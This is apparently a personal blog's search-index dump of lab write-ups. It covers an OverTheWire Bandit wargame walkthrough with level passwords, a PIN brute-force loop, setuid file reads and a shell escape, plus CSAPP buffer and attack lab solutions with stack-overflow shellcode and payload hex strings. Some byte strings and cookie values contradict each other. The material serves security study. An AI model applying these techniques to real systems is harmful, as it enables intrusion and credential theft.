containerd-shim文档\n","date":"2024-10-23T00:00:00Z","image":"https://chenyuan1125.github.io/p/containerd%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/1_hu2969935857509030280.jpg","permalink":"https://chenyuan1125.github.io/p/containerd%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/","title":"containerd通信机制分析"},{"content":"参考博客：OverTheWire: Level Goal: Bandit Level 12 → Level 13\nlevel12-13 主要思路： 先将文件转化为二进制文件，再利用file命令查看文件类型，根据文件类型来解压缩\nlevel17-18 利用diff -a\nlevel18-19 The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.\n1 ssh -p 2220 bandit18@bandit.labs.overthewire.org cat readme level19-20 setuid，利用bandit20.do文件来提权root\n1 ./bandit20-do cat /etc/bandit_pass/bandit20 level20-21 利用nc -lv 监听端口，再用./suconnect 端口号连接\nlevel21-22 找到对应的crond脚本\nlevel22-23 找到对应脚本,再把bandit23的mytarget找出来，再读取密码\n1 2 3 4 5 6 7 8 9 10 bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d \u0026#39; \u0026#39; -f 1 level23-24 找到对应脚本，参考上一个level的脚本，创建一个新的脚本来获取密码，注意文件的权限问题\n1 2 3 #!/bin/bash cat /etc/bandit_pass/bandit24 \u0026gt; /tmp/bandit24/bandit24 level24-25 Level Goal\nA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time\ntips： nc localhost 30002 利用shell脚本进行爆破\n注意程序可能会因为超时卡住，所以要分段爆破\n1 2 3 4 5 6 for i in {0000..9999} do echo \u0026#34;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i\u0026#34; \u0026gt;\u0026gt; ./banditpin done cat ./banditpin | nc localhost 30002 \u0026gt;\u0026gt; ./bandit25pass level25-26 Level Goal\nLogging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.\n参考博客：OverTheWire Bandit Level 25 -\u0026gt; 26 - Walkthrough - MayADevBe Blog\nls发现目录下有bandit26的私钥，尝试使用ssh -i 进行连接，连接失败，由于/bin/bash被修改。\n利用cat /etc/passwd查看bandit26所使用的shell，发现为/usr/bin/showtext，再查看这个文件，发现它是个脚本，并且通过more打开了text.txt文件，\n1 2 3 4 5 6 7 8 9 10 11 bandit25@bandit:~$ cat /etc/passwd | grep bandit26 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ ls -la /usr/bin/showtext -rwxr-xr-x 1 root root 53 May 7 2020 /usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 再次尝试ssh连接，失败\n1 2 3 4 5 6 7 8 9 $ ssh -i bandit26.sshkey bandit26@localhost ... _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| / / \u0026#39;_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to bandit.labs.overthewire.org closed. 分析原因，如果text.txt文件超过一页，那么more text.txt就会等待翻页，显然，text.txt文件太小，此时需要另辟蹊径，既然文件本身改变不了，那么反过来改变运行窗口的大小也能起到同样的作用。\n进入more以后，使用v进入vim编辑模式，再通过\u0026quot;:e /etc/bandit_pass_bandit26\u0026quot;得到password。（-e 打开文件）\n或者通过:set shell=/bin/bash :shell 来进入bandit26用户\nlevel26-27 Level Goal\nGood job getting a shell! Now hurry and grab the password for bandit27!\nbandit27.do已被setid，所以执行这个文件时会短暂使用root用户权限，借此我们可以执行其它命令。\n1 2 3 4 5 6 7 bandit26@bandit:~$ ls bandit27-do text.txt bandit26@bandit:~$ ./bandit27-do Run a command as another user. Example: ./bandit27-do id bandit26@bandit:~$ ./bandit27-do cat /etc/bandit\\_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea level27-28 Level Goal\nThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.\nClone the repository and find the password for the next level.\n在/tmp创建一个目录，接着在目录下git init，再git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo，注意端口号。最后读取README文件即成功\npassword：AVanL161y9rsbcJIsFHuw35rjaOM19nR\nlevel28-29 Level Goal\nThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.\nClone the repository and find the password for the next level.\ntips：\ngit log，show us the commit log git show show us the content of a commit (when creating a public repository it is important to be aware of the information you push to it since changes and previous version are saved. So sensitive data, like passwords, could still be retrieved). 克隆远程仓库后发现readme.md文件里没有显示password，无从下手，参考别人的博客发现这两个命令，于是迎刃而解。还是得积累更多的知识。\nlevel29-30 Level Goal There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.\nClone the repository and find the password for the next level.\n参照上个level的流程，发现\n1 2 3 4 5 6 7 8 bandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u0026lt;no passwords in production!\u0026gt; production提示我们有其它的环境\n于是利用git branch -a查看是否有其它分支，发现dev环境\n1 2 3 4 5 6 bandit29@bandit:/tmp/bandit29/repo$ git branch -a * master remotes/origin/HEAD -\u0026gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev 使用git checkout dev或git switch dev切换分支\n1 2 bandit29@bandit:/tmp/bandit29/repo$ git checkout remotes/origin/dev Note: switching to \u0026#39;remotes/origin/dev\u0026#39; 最后查看仓库，找到密码\n1 2 3 4 5 6 7 8 9 10 bandit29@bandit:/tmp/bandit29/repo$ ls code README.md bandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS level30-31 Level Goal\nThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.\nClone the repository and find the password for the next level.\n与上面几个level的差异是这个level使用git tag来解决\nGit tagging is a way to mark specific points in the history of the repository. One example would be to mark release points of the software. The command to see the tags is git tag. To create a tag the command is git tag -a \u0026lt;tag_name\u0026gt; -m \u0026lt;\u0026quot;tag description/message\u0026quot;\u0026gt;. To see more details, like the tag message and commit, you can use the following command: git show \u0026lt;tag_name\u0026gt;.\n1 2 3 4 bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git tag secret bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git show secret OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt level31-32 Level Goal\nThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.\nClone the repository and find the password for the next level.\nTips\nGit Commit saves the currently made changes with a message describing these changes. The flag -a makes sure all modified/deleted files are staged.\nGit Push updates local changes in remote repositories. When pushing for the first time, you should also define the branch with -u.\nGit Ignore is a file with the filename ‘.gitignore’. In this file, all file names/extensions that should be ignored by the commit are written. This means if a file which is in the ignore file is created/changed, it will not be part of the commit/repository. Git ignore also allows for wildcards. (For example, : ‘*.pyc’ means all files with the ending ‘.pyc’ will be ignored.) There are pre-written files for specific situations and languages, like this one for Python.\nGit Add updates what files will be part of the next commit. The -f flag forces files to be able to be committed, even when they are normally ignored.\n.gitignore用来过滤本地仓库的一些文件或目录，使得在上传至远程仓库时忽略这些文件和目录，具体用法STFW\n解法：克隆远程仓库后查看readme.md文件，发现如下提示，按照提示创建key.txt文件，并把\u0026rsquo;May I come in?\u0026lsquo;写入，接着push到远程仓库，发现报错，于是修改.gitignore的文件内容使得其能正常push到远程仓库。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 bandit31@bandit:/tmp/bandit31/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: \u0026#39;May I come in?\u0026#39; Branch: master bandit31@bandit:/tmp/bandit31/repo$ git add . bandit31@bandit:/tmp/bandit31/repo$ git commit -a -m\u0026#34;first\u0026#34; [master 50ed76a] first 2 files changed, 2 insertions(+), 1 deletion(-) create mode 100644 key.txt Enumerating objects: 6, done. Counting objects: 100% (6/6), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (4/4), 331 bytes | 331.00 KiB/s, done. Total 4 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo level32-33 After all this git stuff its time for another escape. Good luck!\nTips\nLinux has Variables called local variables (valid in current shell), shell variables (set up by shell) and environment variables (valid systemwide). These variables have their names in uppercase only. They are defined by writing VAR_NAME=var_value in the command line. To see the content of a variable, you can write echo $VAR_NAME.\nTo print all environment variables, you can use printenv.\nSome common that are good to know are:\nTERM - current terminal emulation HOME - the path to home directory of currently logged in user LANG - current locales settings PATH - directory list to be searched when executing commands PWD - pathname of the current working directory SHELL/0 - the path of the current user’s shell USER - currently logged-in user 解法：因为shell把我们输入的字符全部转换为大写了，所以无法执行正常的指令，大写的字符一般与环境变量有关，$0表示所使用shell的名字，$$表示进程id，通过使用$0来进入正常shell，接着进入bandit33查看密码\n1 2 3 4 5 6 7 8 $ exit \u0026gt;\u0026gt; $0 $ whoami bandit33 $ ls uppershell $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/1_hu5058548300299695135.jpg","permalink":"https://chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/","title":"bandit实验"},{"content":"buffer实验 Level 0: Candle 目标：执行 smoke()，而不是让 getbuf() 返回 1。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void test() { int val; /* Put canary on stack to detect possible corruption */ volatile int local = uniqueval(); val = getbuf(); /* Check for corrupted stack */ if (local != uniqueval()) { printf(\u0026#34;Sabotaged!: the stack has been corrupted\\n\u0026#34;); } else if (val == cookie) { printf(\u0026#34;Boom!: getbuf returned 0x%x\\n\u0026#34;, val); validate(3); } else { printf(\u0026#34;Dud: getbuf returned 0x%x\\n\u0026#34;, val); } } 在bufboms.s的第 363 行找到了 smoke 的地址 08048c18：\n再研究 test 的部分汇编代码：\n1 2 3 4 5 6 7 8 9 10 08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; getbuff:\n1 2 3 4 5 6 7 8 9 10 080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 可以看到 lea 把 buf 的指针地址 (-0x28 (% ebp)) 传给了 Gets ()，0x28 也就是十进制的 40 个字节。而 ebp 占了 4 个字节，buf 距离 getbuff 的返回地址还有 44 个字节。\n返回地址 需要修改的地址 ebp - 占用4字节 \u0026hellip; \u0026hellip; ebp - 40 字节 buf 数组的初始地址 \u0026hellip; \u0026hellip; ebp - 0x38 esp，栈帧首地址 从文档中得知：\nGets 函数不验证是否超出了 NORMAL_BUFFER_SIZE，所以超出字符的就会覆盖掉内存。\n那么只要在 buf 开始处随便填入 44 字节（0a 除外，会终止输入），然后在后面加入 smoke 的地址，覆盖掉栈中的返回地址即可。\n另外需要注意的是 x86 机器为小端法机器，最低有效字节在内存的前面，所以在 exploit.txt 中填入如下答案即可：\n1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08 level 1：Sparker 目标：调用fizz函数，并且通过传递自己的cookie值作为参数，以此来通过验证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 08048c42 \u0026lt;fizz\u0026gt;: 8048c42:\t55 push %ebp 8048c43:\t89 e5 mov %esp,%ebp 8048c45:\t83 ec 18 sub $0x18,%esp 8048c48:\t8b 45 08 mov 0x8(%ebp),%eax 8048c4b:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048c51:\t75 26 jne 8048c79 \u0026lt;fizz+0x37\u0026gt; 8048c53:\t89 44 24 08 mov %eax,0x8(%esp) 8048c57:\tc7 44 24 04 ee a4 04 movl $0x804a4ee,0x4(%esp) 8048c5e:\t08 8048c5f:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c66:\te8 55 fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c6b:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c72:\te8 04 07 00 00 call 804937b \u0026lt;validate\u0026gt; 8048c77:\teb 18 jmp 8048c91 \u0026lt;fizz+0x4f\u0026gt; 8048c79:\t89 44 24 08 mov %eax,0x8(%esp) 8048c7d:\tc7 44 24 04 40 a3 04 movl $0x804a340,0x4(%esp) 8048c84:\t08 8048c85:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c8c:\te8 2f fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c91:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048c98:\te8 63 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; 栈结构示意图：\n地址 解释 ebp + 8 字节 val 返回地址 应当为 fizz 的首地址 ebp 占4字节 \u0026hellip; \u0026hellip; ebp-40字节 buf数组的初始地址 同样是在buf中插入cookie值，注意函数参数在函数返回地址之前，所以，cookie值应该插入在ebp+8起始的八个字节中，所以在 exploit.txt 中填入如下答案即可：\n1 2 3 4 5 6 7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 86 07 ce 2b level2：Firecracker 目标：调用bang函数，并且修改global_value为自己的cookie值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 08048c9d \u0026lt;bang\u0026gt;: 8048c9d:\t55 push %ebp 8048c9e:\t89 e5 mov %esp,%ebp 8048ca0:\t83 ec 18 sub $0x18,%esp 8048ca3:\ta1 00 d1 04 08 mov 0x804d100,%eax 8048ca8:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048cae:\t75 26 jne 8048cd6 \u0026lt;bang+0x39\u0026gt; 8048cb0:\t89 44 24 08 mov %eax,0x8(%esp) 8048cb4:\tc7 44 24 04 60 a3 04 movl $0x804a360,0x4(%esp) 8048cbb:\t08 8048cbc:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048cc3:\te8 f8 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cc8:\tc7 04 24 02 00 00 00 movl $0x2,(%esp) 8048ccf:\te8 a7 06 00 00 call 804937b \u0026lt;validate\u0026gt; 8048cd4:\teb 18 jmp 8048cee \u0026lt;bang+0x51\u0026gt; 8048cd6:\t89 44 24 08 mov %eax,0x8(%esp) 8048cda:\tc7 44 24 04 0c a5 04 movl $0x804a50c,0x4(%esp) 8048ce1:\t08 8048ce2:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048ce9:\te8 d2 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cee:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048cf5:\te8 06 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; 已知变量的内存地址，我们可以通过插入恶意代码来修改变量的值，汇编代码如下：\n1 2 3 4 5 # 改变 global_value movl $0x2bce0786,0x804d100 # 将 bang 函数的首地址压入栈 pushl $0x08048c9d ret 接下来就是将汇编语言转换成十六进制的机器代码了。使用gcc -m32 -c 和 objdump -d可以得到转换之后的文件：\n1 2 3 4 5 00000000 \u0026lt;.text\u0026gt;: 0:\tc7 05 00 d1 04 08 86 movl $0x2bce0786,0x804d100 7:\t07 ce 2b a:\t68 9d 8c 04 08 push $0x8048c9d f:\tc3 ret 那么所有的字节就是 c7 05 00 d1 04 08 70 5a 2d 36 68 9d 8c 04 08 c3。接下来回到 getbuff 的汇编代码：\n1 2 3 4 5 6 7 8 9 10 080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 构造栈的结构：\n地址 解释 0x55683e78 入侵代码的起始地址，也就是调用get函数前eax寄存器的值 ebp \u0026hellip; ret push $0x08048c9d 0x08048c9d为bang函数的起始地址 movl $0x2bce0786,0x804d100 0x804d100为global_value变量的内存地址，0x2bce0786为hack对应的cookie值,当前地址为buf数组的初始地址 rsp-40字节 结合以上信息，构造下列答案：\n1 2 3 4 5 6 c7 05 00 d1 04 08 86 07 ce 2b 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 3e 68 55 运行结果如下：\nlevel3： Dynamite 目标：注入一段能够修改 getbuf 返回值的代码，返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 的剩下部分，注意getbuf函数开头的push %ebp。\n同样回到 getbuff 的汇编代码：\n1 2 3 4 5 6 7 8 9 10 080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret 注意到调用Gets函数后，会将eax寄存器置1，于是我们需要跳过这条命令，再修改eax寄存器的值，最后返回到调用getbuf函数的下一条命令，不能回到getbuf函数的leave命令，因为返回test函数的地址已经没了，如果返回到getbuf函数的leave命令，那么还需在ret后面添加test函数的返回地址。\n结合 test 的前几行代码：\n1 2 3 4 5 6 7 8 9 10 08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 所以应当构造 Gets 的栈帧如下：\n地址 解释 返回地址 设置成缓冲区的首地址 ebp 占用4字节 \u0026hellip; \u0026hellip; ebp - 40 字节 buf 数组的初始地址，从这里开始注入修改 eax 的代码 \u0026hellip; \u0026hellip; ebp - 0x38 esp，栈帧首地址 构造的汇编命令如下：\n1 2 3 4 00000000 \u0026lt;.text\u0026gt;: 0:\tb8 86 07 ce 2b mov $0x2bce0786,%eax 5:\t68 0a 92 04 08 push $0x804920a a:\tc3 ret 为了防止对栈的破坏，ebp 是被调用者保存寄存器，是 test 在调用 getbuf 之后，getbuf 首先就就压进了栈帧里。同时为了使程序继续运行，需要保证 ebp 不被破坏。使用 gdb，在 getbuf 的第一行 0x080491f4 处打下断点，研究此时ebp 的值，ebp的值为0x55683ed0。\n所以构造的答案为：\n1 2 3 4 5 6 b8 86 07 ce 2b 68 be 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0 3e 68 55 78 3e 68 55 最后的运行结果为：\nlevel4：Nitroglycerin（这个实验的解题思路有点没有理解） 目标：使用-n参数进入该实验，该实验会连续调用5次getbufn，要求我们每次在调用getbufn函数后返回cookie值，而不是1，同时还需恢复所有破坏。\n和前面不同的是，这一个阶段由于使用的是 getbufn 和 testn 函数，并且需要将一个相同的字符串输入五次。所以需要使用命令-n\n同时，文档也指出在 getbufn 中有#define KABOOM_BUFFER_SIZE 512，所以缓冲区大小为 512.\n这次研究 getbufn 的汇编代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 (gdb) disas Dump of assembler code for function getbufn: 0x0804920c \u0026lt;+0\u0026gt;:\tpush %ebp 0x0804920d \u0026lt;+1\u0026gt;:\tmov %esp,%ebp # esp 减去了 536 个字节 0x0804920f \u0026lt;+3\u0026gt;:\tsub $0x218,%esp # buf 的首地址空间离 ebp 有 520 个字节 =\u0026gt; 0x08049215 \u0026lt;+9\u0026gt;:\tlea -0x208(%ebp),%eax 0x0804921b \u0026lt;+15\u0026gt;:\tmov %eax,(%esp) 0x0804921e \u0026lt;+18\u0026gt;:\tcall 0x8048cfa \u0026lt;Gets\u0026gt; 0x08049223 \u0026lt;+23\u0026gt;:\tmov $0x1,%eax 0x08049228 \u0026lt;+28\u0026gt;:\tleave 0x08049229 \u0026lt;+29\u0026gt;:\tret End of assembler dump. 在这一阶段，getbufn 会调用 5 次，每次的储存的 ebp 都不一样，官方文档表示这个差值会在 +- 240 的样子：\n接下来使用 gdb，在 getbufn 打下断点，连续 5 次查看 % ebp 的值，可以得到这五次 ebp 的值分别是在：\nNo p/x $ebp p/x $ebp - 0x208 1 0x55683110 0x55682f08 2 0x556830b0 0x55682ea8 3 0x55683100 0x55682ef8 4 0x55683110 0x55682f08 5 0x55683180 0x55682f78 对应的，buf 的起始地址就是每一次记的 ebp 减去 208，也就是 520 字节。\n所以每一次的地址是无法确认的。英文文档中介绍了可以使用 nop sled 的方法来解决这一问题。参考 CSAPP 教材中的介绍：\n因为在这个实验中，栈的地址是变化的。我们不知道有效机器代码的入口地址了，因此我们需要在有效机器代码前填充大量的nop指令，只要程序可以跳转到这些nop指令中，那么最终就可以滑到有效的机器代码。\n运行getbufn函数时，会随机在栈上分配一块存储地址，因此，getbufn的基址ebp时随机变化的。但是又要求我们写的跳转地址是固定的，所以我们应该在有效代码之前大量填充nop指令，让这段地址内的代码都会滑到这段nop之后的代码上。\n由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。\n从反汇编可以看出，buf的首地址为ebp-0x208，所以buf总共的大小为520字节。考虑这个函数中，testn的ebp随每次输入都随机变化，但是栈顶esp的位置却不变，所以我们可以通过esp和ebp的关系来找出这个关系，从而进行攻击\n首先在sub $0x218，esp这一句设置断点，并使用-n模式运行程序，并查看ebp的值。\n我们要做的是找出最大的ebp值0x556835e0，再减去0x208，即为最高的buf的始地址为：0x556833D8。\n如果将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址0x556833D8后顺利到达有效机器代码\n接下来需要处理的问题是注入并覆盖 ebp 后，把正确的 esp 还原回去。研究 testn 的部分汇编代码：\n1 2 3 4 5 6 7 8 9 10 Dump of assembler code for function testn: 0x08048e26 \u0026lt;+0\u0026gt;:\tpush %ebp 0x08048e27 \u0026lt;+1\u0026gt;:\tmov %esp,%ebp 0x08048e29 \u0026lt;+3\u0026gt;:\tpush %ebx 0x08048e2a \u0026lt;+4\u0026gt;:\tsub $0x24,%esp 0x08048e2d \u0026lt;+7\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; 0x08048e32 \u0026lt;+12\u0026gt;:\tmov %eax,-0xc(%ebp) 0x08048e35 \u0026lt;+15\u0026gt;:\tcall 0x804920c \u0026lt;getbufn\u0026gt; 0x08048e3a \u0026lt;+20\u0026gt;:\tmov %eax,%ebx 0x08048e3c \u0026lt;+22\u0026gt;:\tcall 0x8048d90 \u0026lt;uniqueval\u0026gt; 在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于 push ebx 而减去了 4，再手动减去了 0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。\n所以构造出来的汇编代码如下：\n1 2 3 4 lea 0x28(%esp), %ebp mov $0x362d5a70, %eax push $0x08048e3a ret 地址 解释 返回地址 设置成缓冲区的首地址 ebp 占用4字节 \u0026hellip; \u0026hellip; ebp - 520字节 buf 数组的初始地址，从这里开始注入修改 eax 的代码 \u0026hellip; \u0026hellip; ebp - 0x218 esp，栈帧首地址 ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/1_hu5285632878379324052.jpg","permalink":"https://chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/","title":"CSAPP:buffer实验"},{"content":"Attack lab 该实验在我电脑的wsl的ubuntu操作系统下无法正常运行，在debian环境下能正常运行，注意运行时要加上-q\nPart I:Code Injection Attacks Level 1 通过输入字符串，利用栈溢出原理，将getbuf函数的返回地址改成touch1函数的入口地址\n注意字节顺序\ngetbuf函数的反汇编代码\n1 2 3 4 5 6 7 8 9 00000000004017a8 \u0026lt;getbuf\u0026gt;: 4017a8:\t48 83 ec 28 sub $0x28,%rsp 4017ac:\t48 89 e7 mov %rsp,%rdi 4017af:\te8 8c 02 00 00 call 401a40 \u0026lt;Gets\u0026gt; 4017b4:\tb8 01 00 00 00 mov $0x1,%eax 4017b9:\t48 83 c4 28 add $0x28,%rsp 4017bd:\tc3 ret 4017be:\t90 nop 4017bf:\t90 nop phase_1.txt文件\n1 2 3 4 5 6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 运行命令\n1 ./hex2raw \u0026lt; phase_1.txt |./ctarget -q Level 2 level2需要将vlevel的值改成cookie值，再return到touch2函数入口处。\n修改后的rsp寄存器如下所示：\nphase_2.txt文件\n1 2 3 4 5 6 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 运行命令\n1 ./hex2raw \u0026lt; phase_1.txt |./ctarget -q 结果\n1 2 3 4 5 6 7 8 Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 Level3 本题与上题类似，不同点在于传的参数是一个字符串。先给出touch3的C语言代码\n1 2 3 4 5 6 7 8 9 10 11 12 void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } touch3中调用了hexmatch，它的C语言代码为：\n1 2 3 4 5 6 7 8 9 /* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, 